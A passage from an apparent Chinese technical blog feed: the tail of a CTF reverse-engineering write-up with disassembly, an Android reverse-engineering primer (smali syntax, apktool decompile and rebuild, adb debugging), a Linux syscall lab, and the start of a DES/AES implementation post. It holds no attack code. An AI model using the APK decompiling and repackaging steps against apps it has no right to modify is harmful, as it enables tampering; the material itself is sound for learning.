): jmp .+116                 ; eb7400000c84: (                    ): lea eax, dword ptr ds:[ecx*4+2916] ; 8d048d640b000000000c8b: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000c8d: (                    ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b000000000c93: (                    ): mov dword ptr ds:[ecx], eax ; 890100000c95: (                    ): iret                      ; cf00000c96: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c9d: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000c9f: (                    ): test eax, eax             ; 85c000000ca1: (                    ): jnz .+85                  ; 755500000ca3: (                    ): lea eax, dword ptr ds:[ecx*4+2916] ; 8d048d640b000000000caa: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000cac: (                    ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b000000000cb2: (                    ): mov dword ptr ds:[ecx], eax ; 890100000cb4: (                    ): iret                      ; cf00000cb5: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000cbc: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000cbe: (                    ): test eax, eax             ; 85c000000cc0: (                    ): jz .+54                   ; 743600000cc2: (                    ): lea eax, dword ptr ds:[ecx*4+2916] ; 8d048d640b000000000cc9: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000ccb: (                    ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b000000000cd1: (                    ): mov dword ptr ds:[ecx], eax ; 890100000cd3: (                    ): iret                      ; cf00000cd4: (                    ): lea eax, dword ptr ds:0x00000f94 ; 8d05940f000000000cda: (                    ): call .-3061               ; e80bf4ffff00000cdf: (                    ): hlt                       ; f400000ce0: (                    ): lea eax, dword ptr ds:0x00000fa0 ; 8d05a00f000000000ce6: (                    ): call .-3073               ; e8fff3ffff00000ceb: (                    ): lea eax, dword ptr ds:0x00000fae ; 8d05ae0f000000000cf1: (                    ): call .-3084               ; e8f4f3ffff00000cf6: (                    ): hlt                       ; f400000cf7: (                    ): hlt                       ; f400000cf8: (                    ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b000000000cfe: (                    ): mov eax, dword ptr ds:[ecx] ; 8b0100000d00: (                    ): add eax, 0x00000003       ; 83c00300000d03: (                    ): mov dword ptr ds:[ecx], eax ; 890100000d05: (                    ): iret                      ; cf</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.52pojie.cn/thread-936377-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-936377-1-1.html</a><br><a href="https://blog.csdn.net/ice__snow/article/details/50654629" target="_blank" rel="noopener">https://blog.csdn.net/ice__snow/article/details/50654629</a><br><a href="https://blog.51cto.com/4201689/1420063" target="_blank" rel="noopener">https://blog.51cto.com/4201689/1420063</a><br><a href="https://www.cnblogs.com/playmak3r/p/12079833.html" target="_blank" rel="noopener">https://www.cnblogs.com/playmak3r/p/12079833.html</a><br><a href="https://blog.qrzbing.cn/2019/04/27/CISCN2019-strange-int/" target="_blank" rel="noopener">https://blog.qrzbing.cn/2019/04/27/CISCN2019-strange-int/</a><br><a href="http://imushan.com/2018/07/11/os/Bochs%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E7%AF%87/" target="_blank" rel="noopener">http://imushan.com/2018/07/11/os/Bochs%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E7%AF%87/</a><br><a href="https://www.cnblogs.com/mlzrq/p/10223079.html#%E4%BD%BF%E7%94%A8bochs%E8%B0%83%E8%AF%95" target="_blank" rel="noopener">https://www.cnblogs.com/mlzrq/p/10223079.html#%E4%BD%BF%E7%94%A8bochs%E8%B0%83%E8%AF%95</a><br><a href="https://mrh1s.top/posts/d2cf12e4/" target="_blank" rel="noopener">https://mrh1s.top/posts/d2cf12e4/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android逆向入门（一）</title>
    <link href="/2020/01/16/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2020/01/16/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>开始学习安卓。</p><a id="more"></a><h1 id="APK-的组成"><a href="#APK-的组成" class="headerlink" title="APK 的组成"></a>APK 的组成</h1><ul><li>asset 文件夹<ul><li>资源目录，不需要生成索引，在 Java 代码中需要用 AssetManager 来访问</li></ul></li><li>lib 文件夹<ul><li>so 库存放位置，一般由 NDK 编译得到，常见于使用游戏引擎或 JNI native 调用的工程中</li></ul></li><li>META-INF 文件夹<ul><li>存放工程的一些属性文件，例如 Manifest.MF</li></ul></li><li>res 文件夹<ul><li>资源目录，在编译时自动生成索引文件（R.java），在 Java 代码中用 R.xxx.yyy 来引用</li></ul></li><li>AndroidManifest.xml<ul><li>Android 工程的基础配置属性文件（描述 Android 应用的信息，包括类名、组件名等）</li></ul></li><li>classes.dex<ul><li>Java 代码编译得到的 Dalvik VM 能直接执行的文件</li></ul></li><li>resources.arsc<ul><li>对 res 目录下资源的一个索引文件，保存了原工程中 string.xml 等文件内容</li></ul></li><li>其他文件夹</li></ul><p>一般来说，除了音频和视频资源（需要放在 raw 或 asset 下），使用 Java 开发的 Android 工程使用到的资源文件都会放在 res 下；使用 C++游戏引擎（或使用 Lua Unity3D 等）的资源文件均需要放在 asset 下。</p><h1 id="Dalvik-字节码"><a href="#Dalvik-字节码" class="headerlink" title="Dalvik 字节码"></a>Dalvik 字节码</h1><p>Dalvik 是谷歌专门为 Android 操作系统设计的一个虚拟机，经过深度的优化。虽然 Android 上的程序是使用 Java 来开发的，但是 Dalvik 和标准的 Java 虚拟机 JVM 还是两回事。Dalvik VM 是基于寄存器的，而 JVM 是基于栈的；Dalvik 有专属的文件执行格式 dex（Dalvik Executable），而 JVM 则执行的是 Java 字节码。Dalvik VM 比 JVM 速度更快，占用空间更少。</p><h1 id="Smali-文件结构"><a href="#Smali-文件结构" class="headerlink" title="Smali 文件结构"></a>Smali 文件结构</h1><p>Smali、Baksmali 分别是指 Android 系统里的 Dalvik 虚拟机所使用的一种 dex 格式文件的汇编器、反汇编器。其语法是一种宽松式的 Jasmin/Dedexer 语法，而且它实现了 dex 格式所有功能（注解、调试信息、线路信息等）。</p><p>当我们对 APK 文件进行反编译后，便会生成此类文件。其中在 Dalvik 字节码中，寄存器都是 32 位的，能够支持任何类型，64 位类型（Long/Double）用 2 个寄存器表示；Dalvik 字节码有两种类型：原始类型、引用类型（包括对象和数组）。</p><h2 id="头部定义"><a href="#头部定义" class="headerlink" title="头部定义"></a>头部定义</h2><ul><li><code>.class</code></li><li><code>.super</code></li><li><code>.source</code></li></ul><h2 id="域定义"><a href="#域定义" class="headerlink" title="域定义"></a>域定义</h2><ul><li><code>.field public</code></li><li><code>.field static</code></li><li><code>.field private</code></li><li>…</li></ul><h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><h3 id="Smali-函数（使用-P-V-寄存器）"><a href="#Smali-函数（使用-P-V-寄存器）" class="headerlink" title="Smali 函数（使用 P-V 寄存器）"></a>Smali 函数（使用 P-V 寄存器）</h3><p>在 smali 里的所有操作都必须经过寄存器来进行：本地寄存器用 v 开头、数字结尾的符号来表示，如 v0、v1、v2 等；参数寄存器则使用 p 开头、数字结尾的符号来表示，如 p0、p1、p2 等。特别注意的是，p0 不一定是函数中的第一个参数，在非 static 函数中，p0 代指 this，p1 表示函数的第一个参数，p2 代表函数中的第二个参数；而在 static 函数中 p0 才对应第一个参数（因为 Java 的 static 方法中没有 this 方法）。</p><pre><code class="smali">.method 访问修饰符 函数名 函数签名    .locals n # 使用 n 个寄存器，即 v0~v(n-1)    .param p1, &quot;savedInstanceState&quot; # Landroid/os/Bundle # 注释    ... # 函数实现    return-xxx # 返回.end method</code></pre><h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>参数通过寄存器传递（Pn、Vn）</p><pre><code class="smali">Invoke{参数}, 方法名</code></pre><h2 id="Smali-字段描述符"><a href="#Smali-字段描述符" class="headerlink" title="Smali 字段描述符"></a>Smali 字段描述符</h2><table><thead><tr><th style="text-align:center">Java type</th><th style="text-align:center">Type descriptor</th></tr></thead><tbody><tr><td style="text-align:center"><code>void</code></td><td style="text-align:center"><code>V</code></td></tr><tr><td style="text-align:center"><code>boolean</code></td><td style="text-align:center"><code>Z</code></td></tr><tr><td style="text-align:center"><code>char</code></td><td style="text-align:center"><code>C</code></td></tr><tr><td style="text-align:center"><code>byte</code></td><td style="text-align:center"><code>B</code></td></tr><tr><td style="text-align:center"><code>short</code></td><td style="text-align:center"><code>S</code></td></tr><tr><td style="text-align:center"><code>int</code></td><td style="text-align:center"><code>I</code></td></tr><tr><td style="text-align:center"><code>float</code></td><td style="text-align:center"><code>F</code></td></tr><tr><td style="text-align:center"><code>long</code></td><td style="text-align:center"><code>J</code></td></tr><tr><td style="text-align:center"><code>double</code></td><td style="text-align:center"><code>D</code></td></tr><tr><td style="text-align:center"><code>Object</code></td><td style="text-align:center"><code>Ljava/lang/Object;</code></td></tr><tr><td style="text-align:center"><code>int[]</code></td><td style="text-align:center"><code>[I</code></td></tr><tr><td style="text-align:center"><code>byte[]</code></td><td style="text-align:center"><code>[B</code></td></tr><tr><td style="text-align:center"><code>Object[][]</code></td><td style="text-align:center"><code>[[Ljava/lang/Object;</code></td></tr></tbody></table><h2 id="Smali-基本语法"><a href="#Smali-基本语法" class="headerlink" title="Smali 基本语法"></a>Smali 基本语法</h2><table><thead><tr><th style="text-align:center">Keyword descriptor</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center"><code>.field private isFlag:z</code></td><td style="text-align:center">定义变量</td></tr><tr><td style="text-align:center"><code>.method</code></td><td style="text-align:center">方法</td></tr><tr><td style="text-align:center"><code>.parameter</code></td><td style="text-align:center">方法参数</td></tr><tr><td style="text-align:center"><code>.prologue</code></td><td style="text-align:center">方法开始</td></tr><tr><td style="text-align:center"><code>.line 123</code></td><td style="text-align:center">此方法位于第 123 行</td></tr><tr><td style="text-align:center"><code>const/high16 v0, 0x7f03</code></td><td style="text-align:center">把 0x7f03 赋值给 v0</td></tr><tr><td style="text-align:center"><code>return-void</code></td><td style="text-align:center">函数返回 void</td></tr><tr><td style="text-align:center"><code>.end method</code></td><td style="text-align:center">函数结束</td></tr><tr><td style="text-align:center"><code>new-instance</code></td><td style="text-align:center">创建实例</td></tr><tr><td style="text-align:center"><code>iput-object</code></td><td style="text-align:center">对象赋值</td></tr><tr><td style="text-align:center"><code>iget-object</code></td><td style="text-align:center">调用对象</td></tr><tr><td style="text-align:center"><code>move-result-object</code></td><td style="text-align:center">将上一句的结果赋值给寄存器</td></tr><tr><td style="text-align:center"><code>new-array v0, v1, type</code></td><td style="text-align:center">构造指定类型与大小的数组，并赋值给寄存器</td></tr><tr><td style="text-align:center"><code>array-length v0, v1</code></td><td style="text-align:center">获取指定寄存器中数组的长度并赋值给寄存器</td></tr><tr><td style="text-align:center"><code>const/4</code></td><td style="text-align:center">赋值</td></tr><tr><td style="text-align:center"><code>rem-int/2addr v0, v1</code></td><td style="text-align:center">计算模结果存入寄存器</td></tr><tr><td style="text-align:center"><code>int-to-byte</code></td><td style="text-align:center">整型转字节型</td></tr><tr><td style="text-align:center"><code>goto</code></td><td style="text-align:center">直接跳转到指定位置</td></tr><tr><td style="text-align:center"><code>return-object</code></td><td style="text-align:center">返回一个对象类型</td></tr></tbody></table><h2 id="Smali-中函数的调用"><a href="#Smali-中函数的调用" class="headerlink" title="Smali 中函数的调用"></a>Smali 中函数的调用</h2><p>函数分为 direct 和 virtual 两种类型。direct method 就是 private 函数，其余的 public 和 protected 函数都属于 virtual method。</p><h3 id="invoke-static"><a href="#invoke-static" class="headerlink" title="invoke-static"></a><code>invoke-static</code></h3><p>调用静态函数。</p><pre><code class="smali">invoke-static {v0}, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V</code></pre><h3 id="invoke-super"><a href="#invoke-super" class="headerlink" title="invoke-super"></a><code>invoke-super</code></h3><p>调用父类方法用的指令（一般用于调用 onCreate、onDestroy）。</p><h3 id="invoke-direct"><a href="#invoke-direct" class="headerlink" title="invoke-direct"></a><code>invoke-direct</code></h3><p>调用 private 函数。</p><pre><code class="smali">invoke-direct {p0}, Landroid/app/TabActivity;-&gt;&lt;init&gt;()V</code></pre><h3 id="invoke-virtual"><a href="#invoke-virtual" class="headerlink" title="invoke-virtual"></a><code>invoke-virtual</code></h3><p>用于调用 protected 或 public 函数。</p><pre><code class="smali">invoke-virtual {v0,v1}, Lcom/ccc;-&gt;Message(Ljava/lang/Object;)V</code></pre><h3 id="invoke-xxxxx-range"><a href="#invoke-xxxxx-range" class="headerlink" title="invoke-xxxxx/range"></a><code>invoke-xxxxx/range</code></h3><p>当方法参数多于 5 个时（含 5 个），不能直接使用以上指令，而是在后面加上 <code>/range</code> 表示范围。</p><pre><code class="smali">invoke-direct/range {v0 .. v5}, Lcmb/pb/ui/PBContainerActivity;-&gt;h(ILjava/lang/CharSequence;Ljava/lang/String;Landroid/content/Intent;I)Z</code></pre><h2 id="Smali-中的条件跳转分支"><a href="#Smali-中的条件跳转分支" class="headerlink" title="Smali 中的条件跳转分支"></a>Smali 中的条件跳转分支</h2><table><thead><tr><th style="text-align:center">代码</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center"><code>if-eq vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 等于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-ne vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 不等于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-lt vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 小于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-ge vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 大于等于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-gt vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 大于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-le vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 小于等于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-eqz vA, :cond_**</code></td><td style="text-align:center">如果 vA 等于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-nez vA, :cond_**</code></td><td style="text-align:center">如果 vA 不等于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-ltz vA, :cond_**</code></td><td style="text-align:center">如果 vA 小于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-gez vA, :cond_**</code></td><td style="text-align:center">如果 vA 大于等于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-gtz vA, :cond_**</code></td><td style="text-align:center">如果 vA 大于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-lez vA, :cond_**</code></td><td style="text-align:center">如果 vA 小于等于 0 则跳转到 <code>:cond_**</code></td></tr></tbody></table><h2 id="Smali-代码编写"><a href="#Smali-代码编写" class="headerlink" title="Smali 代码编写"></a>Smali 代码编写</h2><h3 id="静态返回-HelloWorld-的方法"><a href="#静态返回-HelloWorld-的方法" class="headerlink" title="静态返回 HelloWorld 的方法"></a>静态返回 HelloWorld 的方法</h3><pre><code class="smali">.class public Lf8/helloworld/helloStr; # 类声明    .super Ljava/lang/Object; # 父类声明    .method public static retHello()Ljava/lang/String; # 函数声明    .locals 1 # 寄存器数量    const-string v0, &quot;Hello World from StaticMethod&quot; # 新建字符串    return-object v0 # 返回Object类型.end method # 方法结束声明</code></pre><h3 id="返回静态-field-的方法"><a href="#返回静态-field-的方法" class="headerlink" title="返回静态 field 的方法"></a>返回静态 field 的方法</h3><pre><code class="smali">.field public static final hStr:Ljava/lang/String; = &quot;Hello World from static field&quot; # field声明与初始化.method public static retHello2()Ljava/lang/String;    .locals 1    sget-object v0, Lf8/helloworld/helloStr;-&gt;hStr:Ljava/lang/String; # 获取field    return-object v0.end method</code></pre><h3 id="普通的函数"><a href="#普通的函数" class="headerlink" title="普通的函数"></a>普通的函数</h3><pre><code class="smali">.method public constructor &lt;init&gt;()V    .locals 0    invoke-direct {p0}, Ljava/lang/Object;-&gt;&lt;init&gt;()V    return-void.end method.method public retHello3()Ljava/lang/String;    .locals 1    const-string v0, &quot;Hello World from Method&quot;    return-object v0.end method</code></pre><h3 id="普通的-field-与函数"><a href="#普通的-field-与函数" class="headerlink" title="普通的 field 与函数"></a>普通的 field 与函数</h3><pre><code class="smali">.field public hStr2:Ljava/lang/String;.method public constructor &lt;init&gt;()V    .locals 1    invoke-direct {p0}, Ljava/lang/Object;-&gt;&lt;init&gt;()V    const-string v0, &quot;Hello field&quot; # 初始化非静态field    iput-object v0, p0, Lf8/helloworld/helloStr;-&gt;hStr2:Ljava/lang/String;    return-void.end method.method public retHello4()Ljava/lang/String;    .locals 1    iget-object v0, p0, Lf8/helloworld/helloStr;-&gt;hStr2:Ljava/lang/String;    return-object v0.end method</code></pre><p>调用时需要先初始化一个实例：</p><pre><code class="smali">new-instance v1, Lf8/helloworld/helloStr;invoke-direct {v1}, Lf8/helloworld/helloStr;-&gt;&lt;init&gt;()Vinvoke-virtual {v1}, Lf8/helloworld/helloStr;-&gt;retHello3()Ljava/lang/String;move-result-object v1</code></pre><h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><h3 id="Android-Log"><a href="#Android-Log" class="headerlink" title="Android Log"></a>Android Log</h3><p>来自于包 <code>android/killer/log</code>。</p><pre><code class="smali">invoke-static {v0}, Lcom/android/killer/Log;-&gt;LogStr(Ljava/lang/String;)V</code></pre><h3 id="LoadLibrary"><a href="#LoadLibrary" class="headerlink" title="LoadLibrary"></a>LoadLibrary</h3><pre><code class="smali">invoke-static {v0}, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V</code></pre><h3 id="stackTrace"><a href="#stackTrace" class="headerlink" title="stackTrace"></a>stackTrace</h3><p>打印当前函数堆栈，方法为 <code>Thread.dumpStack()</code>。</p><pre><code class="smali">invoke-static {}, Ljava/lang/Thread;-&gt;dumpStack()V</code></pre><h3 id="Method-Trace"><a href="#Method-Trace" class="headerlink" title="Method Trace"></a>Method Trace</h3><p>函数跟踪。</p><pre><code class="smali">invoke-static {}, Landroid/os/Debug;-&gt;startMethodTracing()Vinvoke-static {}, Landroid/os/Debug;-&gt;stopMethodTracing()V</code></pre><p>需要添加权限。</p><pre><code class="xml">&lt;uses-permission android:name=&quot;android.permission.READ_EXTERNAL_STORAGE&quot;/&gt;&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;</code></pre><p>保存的 trace 文件可以 dump 出来使用 monitor 来打开。</p><h3 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a>字符串处理</h3><pre><code class="smali">const-string v1, &quot;%d&quot; # 格式化描述符const/4 v2, 0x1 # 数组长度new-array v2, v2 [Ljava/lang/Object; # 创建Object数组aput-object v3, v2, v4 # 填充数组...invoke-static {v1, v2}, Ljava/lang/String;-&gt;format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String; # 格式化字符串# 字符串替换invoke-virtual {v0, v1, v2}, Ljava/lang/String;-&gt;replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;invoke-virtual {v0, v1, v2}, Ljava/lang/String;-&gt;replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;</code></pre><h3 id="waitForDebugger"><a href="#waitForDebugger" class="headerlink" title="waitForDebugger"></a>waitForDebugger</h3><pre><code class="smali">invoke-static {}, Landroid/os/Debug;-&gt;waitForDebugger()V</code></pre><h1 id="apktool-ShakaApktool"><a href="#apktool-ShakaApktool" class="headerlink" title="apktool/ShakaApktool"></a>apktool/ShakaApktool</h1><pre><code class="bash">java -jar apktool.jar d example.apk -o example-dirjava -jar apktool.jar b example-dir -o example.apk</code></pre><table><thead><tr><th style="text-align:center">选项</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>d</code></td><td style="text-align:center">反编译</td></tr><tr><td style="text-align:center"><code>b</code></td><td style="text-align:center">回编译</td></tr></tbody></table><pre><code class="bash">java -jar ShakaApktool.jar d -df example.apk -o example-dirjava -jar ShakaApktool.jar b example-dir -o example.apk</code></pre><table><thead><tr><th style="text-align:center">选项</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>-df</code>、<code>--default-framework</code></td><td style="text-align:center">使用默认的框架资源文件</td></tr></tbody></table><h1 id="安卓-apk-调试（不需要修改原-apk-文件）"><a href="#安卓-apk-调试（不需要修改原-apk-文件）" class="headerlink" title="安卓 apk 调试（不需要修改原 apk 文件）"></a>安卓 apk 调试（不需要修改原 apk 文件）</h1><ol><li>使用 apktool/ShakaApktool 反编译 apk 文件</li><li>在 Android Studio 中导入源码</li><li>设置远程调试选项，Host 填写为 localhost，端口填写为 8700</li><li>使用 adb 以 debug 方式启动 apk：<code>adb shell am start -D -n packageName/ActivityName</code></li><li>下好断点，打开 monitor，开始调试</li></ol><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.bilibili.com/video/av45424886" target="_blank" rel="noopener">https://www.bilibili.com/video/av45424886</a><br><a href="https://www.52pojie.cn/thread-395689-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-395689-1-1.html</a><br><a href="https://www.52pojie.cn/thread-396966-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-396966-1-1.html</a><br><a href="https://www.52pojie.cn/thread-397858-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-397858-1-1.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何给Linux添加系统调用</title>
    <link href="/2019/11/27/%E5%A6%82%E4%BD%95%E7%BB%99Linux%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    <url>/2019/11/27/%E5%A6%82%E4%BD%95%E7%BB%99Linux%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>操作系统实验记录。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>OS：Ubuntu 16.04.6</p><pre><code class="zsh">➜  ~ uname -aLinux ubuntu 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 14:01:10 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</code></pre><h1 id="First-Download-Linux-Kernel-Source"><a href="#First-Download-Linux-Kernel-Source" class="headerlink" title="First: Download Linux Kernel Source"></a>First: Download Linux Kernel Source</h1><pre><code>wget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.20.17.tar.gztar -xvf linux-4.20.17.tar.gzsudo mv linux-4.20.17/ /usr/src/cd /usr/src/linux-4.20.17/</code></pre><h1 id="Second-Install-Dependences"><a href="#Second-Install-Dependences" class="headerlink" title="Second: Install Dependences"></a>Second: Install Dependences</h1><pre><code class="bash">sudo apt updatesudo apt install bison flex libssl-dev libncurses5-dev</code></pre><h1 id="Third-Add-My-Syscall"><a href="#Third-Add-My-Syscall" class="headerlink" title="Third: Add My Syscall"></a>Third: Add My Syscall</h1><p>入口（<code>arch/x86/entry/syscalls/syscall_64.tbl</code>）</p><pre><code># Here are my syscalls548     64      mysyscall               sys_mysyscall</code></pre><p>系统调用声明（<code>include/linux/syscalls.h</code>）</p><pre><code class="c">// Here are my syscallsasmlinkage long sys_mysyscall(void);</code></pre><p>添加调用（<code>kernel/sys.c</code>）</p><pre><code class="c">// Here are my syscallsasmlinkage long sys_mysyscall(void) {    printk(&quot;Hello Kernel!!!\n&quot;);    return 1712190426;}</code></pre><h1 id="Forth-Compile"><a href="#Forth-Compile" class="headerlink" title="Forth: Compile"></a>Forth: Compile</h1><pre><code class="bash">make mrpropermake cleanmake menuconfig # 将Device drivers中的Staging drivers取消# 下面的编译时间比较久 可以通过time记录一下时间time make bzImage # 编译并生成压缩的内核映像 大约半个小时time make modules # 编译模块 大约两个多小时sudo time make modules_install # 安装模块 大约三分多种sudo time make install # 安装内核 大约一分多钟</code></pre><p>编译成功后 reboot 重启系统。</p><h1 id="Fifth-Test"><a href="#Fifth-Test" class="headerlink" title="Fifth: Test"></a>Fifth: Test</h1><pre><code class="zsh">➜  ~ uname -aLinux ubuntu 4.20.17 #1 SMP Thu Nov 28 22:48:22 PST 2019 x86_64 x86_64 x86_64 GNU/Linux</code></pre><p>查看添加的系统调用是否成功：</p><pre><code class="zsh">➜  ~ grep -A 1 mysyscall /proc/kallsyms0000000000000000 T sys_mysyscall0000000000000000 T usermodehelper_read_unlock</code></pre><p>编写测试程序如下：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;sys/syscall.h&gt;int main() {    long ret = syscall(548);    printf(&quot;%ld\n&quot;, ret);    return 0;}</code></pre><p>运行结果，返回值为设定好的值：</p><pre><code class="zsh">➜  ~ ./31712190426</code></pre><p>使用 dmesg 命令（dmesg 命令显示 linux 内核的环形缓冲区信息，我们可以从中获得诸如系统架构、cpu、挂载的硬件，RAM 等多个运行级别的大量的系统信息）查看调用情况：</p><pre><code class="zsh">➜  ~ dmesg | grep &quot;Hello&quot;[  228.310507] Hello Kernel!!!</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.cnblogs.com/tod-reg20130101/articles/9280792.html" target="_blank" rel="noopener">https://www.cnblogs.com/tod-reg20130101/articles/9280792.html</a><br><a href="https://www.zybuluo.com/hakureisino/note/514321" target="_blank" rel="noopener">https://www.zybuluo.com/hakureisino/note/514321</a><br><a href="https://www.jianshu.com/p/b2d5fa8af581" target="_blank" rel="noopener">https://www.jianshu.com/p/b2d5fa8af581</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python实现DES、AES加密解密算法</title>
    <link href="/2019/11/14/Python%E5%AE%9E%E7%8E%B0DES%E3%80%81AES%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <url>/2019/11/14/Python%E5%AE%9E%E7%8E%B0DES%E3%80%81AES%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>通过实现 DES 和 AES 深入了解对称加密（实现均采用 CBC 模式）。</p><a id="more"></a><h1 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h1><p>数据加密标准（英语：Data Encryption Standard，缩写为 DES）是一种对称密钥加密块密码算法，1976 年被美国联邦政府的国家标准局确定为联邦资料处理标准（FIPS），随后在国际上广泛流传开来。它基于使用 56 位密钥的对称算法。这个算法因为包含一些机密设计元素，相对短的密钥长度以及怀疑内含美国国家安全局（NSA）的后门而在开始时有争议，DES 因此受到了强烈的学院派式的审查，并以此推动了现代的块密码及其密码分析的发展。</p><h2 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h2><p>DES 是一种典型的块密码—一种将固定长度的明文通过一系列复杂的操作变成同样长度的密文的算法。对 DES 而言，块长度为 64 位。同时，DES 使用密钥来自定义变换过程，因此算法认为只有持有加密所用的密钥的用户才能解密密文。密钥表面上是 64 位的，然而只有其中的 56 位被实际用于算法，其余 8 位可以被用于奇偶校验，并在算法中被丢弃。因此，DES 的有效密钥长度仅为 56 位。</p><h3 id="整体结构"><a href="#整体结构" class="headerlink" title="整体结构"></a>整体结构</h3><p>算法的整体结构中，有 16 个相同的处理过程（round），并在首尾各有一次置换，称为 $IP$ 与 $FP$（或称 $IP^-1$，$FP$ 为 $IP$ 的反函数。$IP$ 和 $FP$ 几乎没有密码学上的重要性，为了在 1970 年代中期的硬件上简化输入输出数据库的过程而被显式的包括在标准中。</p><p>在主处理回次前，数据块被分成两个 32 位的半块，并被分别处理；这种交叉的方式被称为费斯妥结构。费斯妥结构保证了加密和解密过程足够相似—唯一的区别在于子密钥在解密时是以反向的顺序应用的，而剩余部分均相同。这样的设计大大简化了算法的实现，尤其是硬件实现，因为没有区分加密和解密算法的需要。</p><p>$\oplus$ 符号代表异或（XOR）操作。“F 函数”将数据半块与某个子密钥进行处理。然后，一个 F 函数的输出与另一个半块异或之后，再与原本的半块组合并交换顺序，进入下一个回次的处理。在最后一个回次完成时，两个半块需要交换顺序，这是费斯妥结构的一个特点，以保证加解密的过程相似。</p><p><img src="/pics/Python实现DES、AES加密解密算法/1.png" srcset="/img/loading.gif" alt></p><h3 id="费斯妥函数（F-函数）"><a href="#费斯妥函数（F-函数）" class="headerlink" title="费斯妥函数（F 函数）"></a>费斯妥函数（F 函数）</h3><p>费斯妥函数（F 函数）的过程中，其每次对半块（32 位）进行操作，并包括四个步骤：</p><ul><li>扩张：用扩张置换（图中的 E）将 32 位的半块扩展到 48 位，其输出包括 8 个 6 位的块，每块包含 4 